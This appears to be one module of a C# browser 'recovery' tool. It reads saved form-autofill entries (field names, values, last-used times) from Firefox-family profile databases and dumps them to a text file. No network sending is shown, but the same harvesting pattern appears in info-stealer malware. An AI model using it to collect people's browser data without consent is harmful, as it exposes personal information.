using Microsoft.Data.Sqlite;
using System.Text;

namespace RecoveryTool.Recovery.Browsers.Gecko
{
    public static class GeckoAutofill
    {
        public static async Task RecoverAsync(string browserName, string browserRelativePath)
        {
            await GeckoCommon.RecoverDataAsync(browserName, "Autofill", ProcessProfileAsync, "autofill.txt");
        }

        private static async Task<string> ProcessProfileAsync(string profilePath)
        {
            var sb = new StringBuilder();
            string formHistoryDbPath = Path.Combine(profilePath, "formhistory.sqlite");
            if (!File.Exists(formHistoryDbPath))
            {
                return string.Empty;
            }

            try
            {
                var inputConnectionString = new SqliteConnectionStringBuilder
                {
                    DataSource = formHistoryDbPath,
                    Mode = SqliteOpenMode.ReadOnly,
                    Cache = SqliteCacheMode.Shared
                }.ToString();

                using var inputConn = new SqliteConnection(inputConnectionString);
                using var memConn = new SqliteConnection("Data Source=:memory:");
                await inputConn.OpenAsync();
                await memConn.OpenAsync();
                inputConn.BackupDatabase(memConn);

                string query = @"
                    SELECT 
                        fieldname,
                        value,
                        lastUsed
                    FROM 
                        moz_formhistory
                    ORDER BY 
                        lastUsed DESC;";

                using var cmd = new SqliteCommand(query, memConn);
                using var reader = await cmd.ExecuteReaderAsync();
                while (await reader.ReadAsync())
                {
                    string fieldName = reader["fieldname"] as string ?? "Unknown Field";
                    string value = reader["value"] as string ?? "No Value";
                    long lastUsed = reader["lastUsed"] != DBNull.Value ? Convert.ToInt64(reader["lastUsed"]) : 0;
                    var lastUsedDt = GeckoCommon.UnixTimeStampToDateTime(lastUsed / 1000);
                    sb.AppendLine($"Field Name: {fieldName}");
                    sb.AppendLine($"Value: {value}");
                    sb.AppendLine($"Last Used: {lastUsedDt}");
                    sb.AppendLine(new string('-', 50));
                }
            }
            catch
            {
                return string.Empty;
            }
            return sb.ToString();
        }
    }
}
